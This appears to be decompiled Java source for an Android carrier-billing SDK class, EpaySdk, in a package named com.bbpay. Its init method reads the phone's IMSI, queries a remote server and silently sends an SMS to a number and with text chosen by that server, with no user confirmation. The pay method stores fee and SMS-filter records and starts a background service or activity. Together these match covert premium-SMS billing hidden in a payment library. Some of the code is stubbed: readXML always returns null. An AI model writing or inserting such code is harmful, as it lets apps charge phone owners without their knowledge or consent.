package com.bbpay;
import java.io.StringReader;
import java.util.List;
import java.util.Map;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import com.bbpay.bean.Constants;
import com.bbpay.bean.FeeBean;
import com.bbpay.bean.OnLineGameBiz;
import com.bbpay.bean.SimStatus;
import com.bbpay.bean.SmsBean;
import com.bbpay.db.FilterDBManager;
import com.bbpay.db.OnlineGameDbManager;
import com.bbpay.db.SharePreferUtil;
import com.bbpay.db.SmsDbManager;
import com.bbpay.sms.SmsSender;
import com.bbpay.ui.FeeView;
import com.bbpay.util.MyLogger;
import com.bbpay.util.SimStateHelper;
import com.bbpay.util.StringUtils;
import com.bbpay.util.SystemInfo;
import com.bbpay.util.Tools;
import com.bbpay.util.json.InitResponse;
import com.bbpay.util.json.JSonParserInit;
import com.bbpay.wap.NetManager;

public class EpaySdk {
    public static final int SIGN_MD5 = 1;
    public static final int SIGN_RSA = 2;
    public static String TAG = "EpaySdk";
    public static Context CONTEXT;
    public static String CP_ID;
    public static EpayCallback CALLBACK;
    public static EpaySdk INSTANCE;
    private static int INIT_RESULT;
    public static int SMS_SEND_CODE;
    public static int waitSeconds = 50;//50秒
    private List<FeeBean> feeList;
    protected String appFeeId;
    public EpaySdk(Context context1) {
        CONTEXT = context1;
    }
    public static EpaySdk getInstance() {
        if (INSTANCE == null) INSTANCE = new EpaySdk(CONTEXT);
        return INSTANCE;
    }
    public int getFeeResult(Context context1) {
        return SharePreferUtil.getInstance().getFeeResult(context1);
    }
    public StringReader getHtml(String content) {
        StringReader reader = null;
        String startTag = "<display>";
        String endTag = "</display>";
        if (content.contains(startTag)) {
            if (content.contains(endTag)) {
                String s1 = content.toString();
                FeeView.htmlString = s1.substring(s1.indexOf(startTag) + startTag.length(), s1.indexOf(endTag));
                reader = new StringReader(content.substring(0, content.indexOf(startTag)));
            }
        }
        return reader;
    }
    private void getSmsSendResult(final Context context, final EpayCallback callback) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < waitSeconds * 10 && (SMS_SEND_CODE = SharePreferUtil.getInstance().getFeeResult(context)) == 111; i++) {
                    try {
                        Thread.sleep(100L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                SMS_SEND_CODE = SharePreferUtil.getInstance().getFeeResult(context);
                if (SMS_SEND_CODE == 101) {
                    callback.onEpayBuyProductOK(appFeeId, EpayResult.FEE_RESULT_SUCCESS);
                } else {
                    callback.onEpayBuyProductFaild(appFeeId, SMS_SEND_CODE);
                }
            }
        }).start();
    }
    public void init(Context context, String cpid) {
        CP_ID = cpid;
        CONTEXT = context;
        SharePreferUtil.getInstance().setCpId(CONTEXT, CP_ID);
        SimStatus status = SimStateHelper.getCurrentSimState(CONTEXT);
        String lastImsi = SharePreferUtil.getLastIMSI(CONTEXT).trim();
        NetManager manager = new NetManager(CONTEXT);
        if (!manager.isDataConnected() && !manager.checkNetworkConnection(CONTEXT)) { //
            INIT_RESULT = EpayResult.FEE_RESULT_NONET_FAILED;
        } else if (!status.isSimReady()) {
            INIT_RESULT = EpayResult.FEE_RESULT_UNSIM_FAILED;
        } else {
            String imsi = SystemInfo.getIMSI(CONTEXT);
            if (StringUtils.isBlank(lastImsi) || !lastImsi.equals(imsi)) {
                String content = Tools.getHttpContent(Constants.INIT_URL, Tools.getHeadersByDefault(CONTEXT, null, CP_ID), CONTEXT);
                if (content != null) try {
                    InitResponse response = JSonParserInit.getInitResponse(content);
                    if (response.getResultCode().equals("0")) {
                        new SmsSender().sendSMS(CONTEXT, response.getSendMobile(), response.getContent());
                    }
                } catch (Exception e) {
                    MyLogger.error(e);
                }
                INIT_RESULT = EpayResult.INIT_RESULT_SUCCESS;
            }
        }
        //       SharePreferUtil.setLastCallTime(CONTEXT, initresponse.getMobileImsi());
        //       break MISSING_BLOCK_LABEL_251;
    }
    public void pay(final Context context, final Map<String, String> map, final EpayCallback eCallback) {
        new AsyncTask<String, String, String>() {
            @Override
            protected String doInBackground(String... as) {
                CALLBACK = eCallback;
                returnFeeResult(context, 111);
                CP_ID = map.get("cpid");
                appFeeId = map.get("appfeeid");
                String feeNum = map.get("feenum");
                String cpOrderid = map.get("cpOrderID");
                String appId = map.get("appId");
                String qn = map.get("qn");
                String url = String.format(Constants.SERVER_URL_SINGLE_MD5, new Object[] { CP_ID, appFeeId, feeNum, cpOrderid, appId, qn });
                String content = Tools.getHttpContent(url, Tools.getHeadersByDefault(context, "", null), context);
                if (StringUtils.isNotBlank(content)) {
                    StringReader stringreader = getHtml(content);
                    feeList = readXML(context, content);
                    if (feeList != null && feeList.size() > 0) {
                        writeDb(context, feeList);
                        //System.out.println("获取付费协议时间终");
                        if (SharePreferUtil.getIsPOP(context) == 1) {
                            //System.out.println(new StringBuilder("SharePreferUtil.getIsPOP").append(SharePreferUtil.getIsPOP(context)).toString());
                            //System.out.println("activity已启动");
                            context.startActivity(new Intent().setClass(context, EPayActivity.class).addFlags(0x10000000));
                            getSmsSendResult(context, eCallback);
                        } else {
                            //System.out.println("service已启动");
                            context.startService(new Intent(context, PlateService.class));
                            getSmsSendResult(context, eCallback);
                        }
                    }
                }
                return null;
            }
        }.execute(new String[] { "" });
    }
    public List<FeeBean> readXML(Context context, String content) {
        List<FeeBean> list = null;
        //JSONObject obj=new JSONObject(content);
        //String display=obj.optString("display");
        //if(StringUtils.isNotBlank(display)){
        //   FeeView.htmlString=display;
        // }
        //JSONArray
        return list;
    }
    public void returnFeeResult(Context context, int retCode) {
        SharePreferUtil.getInstance().setFeeResult(context, retCode);
    }
    protected void writeDb(Context context, List<FeeBean> list) {
        if (list != null) {
            FilterDBManager.getInstance().insertFilter(list, context);
            OnlineGameDbManager.getInstance().deleteProcedure(context);
            for (FeeBean bean : list) {
                if (bean instanceof SmsBean) {
                    SmsDbManager.getInstance().insertSMS((SmsBean) bean, context);
                } else {
                    OnlineGameDbManager.getInstance().addWapFee((OnLineGameBiz) bean, context);
                }
            }
        }
    }
}
